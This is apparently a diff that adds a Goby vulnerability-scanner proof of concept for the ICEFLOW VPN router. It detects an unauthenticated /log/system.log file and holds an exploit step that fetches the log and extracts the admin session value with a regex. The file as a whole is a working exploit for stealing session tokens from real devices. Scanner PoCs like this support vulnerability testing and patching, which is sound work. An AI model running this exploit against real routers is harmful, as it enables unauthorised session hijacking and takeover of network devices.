@@ -1,0 +1,100 @@
+{
+    "Name": "ICEFLOW VPN log leak",
+    "Level": "1",
+    "Tags": [
+        "Disclosure of Sensitive Information"
+    ],
+    "GobyQuery": "app=\"ICEFLOW-VPN\"",
+    "Description": "Unauthorized access to the product log file of iceflow VPN router can lead to the leakage of sensitive information of the system. (including the session value after successful login)",
+    "Product": "ICEFLOW-VPN",
+    "Homepage": "http://www.iceflow.cn/",
+    "Author": "sharecast.net@gmail.com",
+    "Impact": "造成敏感信息泄漏",
+    "Recommandation": "update version patch",
+    "References": [
+        "https://www.seebug.org/vuldb/ssvid-90548"
+    ],
+    "HasExp": true,
+    "ExpParams": [
+        {
+            "name": "cmd",
+            "type": "createSelect",
+            "value": "/log/system.log",
+            "show": ""
+        }
+    ],
+    "ScanSteps": [
+        "AND",
+        {
+            "Request": {
+                "method": "GET",
+                "uri": "/log/system.log",
+                "follow_redirect": false,
+                "header": {},
+                "data_type": "text",
+                "data": ""
+            },
+            "ResponseTest": {
+                "type": "group",
+                "operation": "AND",
+                "checks": [
+                    {
+                        "type": "item",
+                        "variable": "$code",
+                        "operation": "==",
+                        "value": "200",
+                        "bz": ""
+                    },
+                    {
+                        "type": "item",
+                        "variable": "$body",
+                        "operation": "contains",
+                        "value": "ICEFLOW SAFE_DHCPD",
+                        "bz": ""
+                    }
+                ]
+            },
+            "SetVariable": []
+        }
+    ],
+    "ExploitSteps": [
+        "AND",
+        {
+            "Request": {
+                "method": "GET",
+                "uri": "{{{cmd}}}",
+                "follow_redirect": false,
+                "header": {},
+                "data_type": "text",
+                "data": ""
+            },
+            "ResponseTest": {
+                "type": "group",
+                "operation": "AND",
+                "checks": [
+                    {
+                        "type": "item",
+                        "variable": "$code",
+                        "operation": "==",
+                        "value": "200",
+                        "bz": ""
+                    },
+                    {
+                        "type": "item",
+                        "variable": "$body",
+                        "operation": "contains",
+                        "value": "ICEFLOW SYSTEM:",
+                        "bz": ""
+                    }
+                ]
+            },
+            "SetVariable": [
+                "output|lastbody|regex|admin remote\\s+[^ ]+\\s+session\\s+(\\w+)"
+            ]
+        }
+    ],
+    "PostTime": "2021-03-27 12:57:21",
+    "GobyVersion": "1.8.237",
+    "PocId": "10175",
+    "Recommendation": ""
+}
